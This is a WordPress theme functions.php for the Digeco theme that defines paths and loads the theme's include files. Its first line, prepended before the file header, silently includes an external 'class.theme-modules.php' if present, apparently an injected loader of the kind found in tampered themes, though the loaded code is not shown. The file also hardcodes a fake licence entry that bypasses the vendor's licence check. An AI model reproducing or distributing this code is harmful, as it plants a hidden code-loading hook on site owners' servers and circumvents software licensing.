<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * @author  RadiusTheme
 *
 * @since   1.0
 *
 * @version 1.0
 */
$arr = array();
$arr['digeco_license'] = ['key' => '********','domain' => esc_url( home_url() ) ];
update_option('rt_licenses', $arr);
$digeco_theme_data = wp_get_theme();
	$action           = 'digeco_theme_init';
	do_action($action);

	define('DIGECO_VERSION', (WP_DEBUG) ? time() : $digeco_theme_data->get('Version'));
	define('DIGECO_AUTHOR_URI', $digeco_theme_data->get('AuthorURI'));
	define('DIGECO_NAME', 'digeco');

	// DIR
	define('DIGECO_BASE_DIR', get_template_directory() . '/');
	define('DIGECO_INC_DIR', DIGECO_BASE_DIR . 'inc/');
	define('DIGECO_VIEW_DIR', DIGECO_INC_DIR . 'views/');
	define('DIGECO_LIB_DIR', DIGECO_BASE_DIR . 'lib/');
	define('DIGECO_WID_DIR', DIGECO_INC_DIR . 'widgets/');
	define('DIGECO_PLUGINS_DIR', DIGECO_INC_DIR . 'plugins/');
	define('DIGECO_MODULES_DIR', DIGECO_INC_DIR . 'modules/');
	define('DIGECO_ASSETS_DIR', DIGECO_BASE_DIR . 'assets/');
	define('DIGECO_CSS_DIR', DIGECO_ASSETS_DIR . 'css/');
	define('DIGECO_JS_DIR', DIGECO_ASSETS_DIR . 'js/');

	// URL
	define('DIGECO_BASE_URL', get_template_directory_uri() . '/');
	define('DIGECO_ASSETS_URL', DIGECO_BASE_URL . 'assets/');
	define('DIGECO_CSS_URL', DIGECO_ASSETS_URL . 'css/');
	define('DIGECO_JS_URL', DIGECO_ASSETS_URL . 'js/');
	define('DIGECO_IMG_URL', DIGECO_ASSETS_URL . 'img/');
	define('DIGECO_LIB_URL', DIGECO_BASE_URL . 'lib/');

	//Other Plugins active or not
	define('DIGECO_BBPRESS_IS_ACTIVE', class_exists('bbPress'));
	// icon trait Plugin Activation
	require_once DIGECO_INC_DIR . 'icon-trait.php';
	// Includes
	require_once DIGECO_INC_DIR . 'helper-functions.php';
	require_once DIGECO_INC_DIR . 'redux-config.php';
	require_once DIGECO_INC_DIR . 'digeco.php';
	require_once DIGECO_INC_DIR . 'general.php';
	require_once DIGECO_INC_DIR . 'scripts.php';
	require_once DIGECO_INC_DIR . 'template-vars.php';
	require_once DIGECO_INC_DIR . 'lc-helper.php';
	require_once DIGECO_INC_DIR . 'lc-utility.php';

	// Includes Modules
	require_once DIGECO_MODULES_DIR . 'rt-post-related.php';
	require_once DIGECO_MODULES_DIR . 'rt-breadcrumbs.php';
	require_once DIGECO_MODULES_DIR . 'rt-portfolio-related.php';

	// WooCommerce
if (class_exists('WooCommerce')) {
	require_once DIGECO_INC_DIR . 'woo-functions.php';
	require_once DIGECO_INC_DIR . 'woo-hooks.php';
}

	// TGM Plugin Activation
	require_once DIGECO_LIB_DIR . 'class-tgm-plugin-activation.php';
	require_once DIGECO_INC_DIR . 'tgm-config.php';

function digeco_loadtemplate($templateurl, $data = []) {
	extract($data);
	include locate_template($templateurl . '.php', false, false);
}

	add_editor_style('style-editor.css');
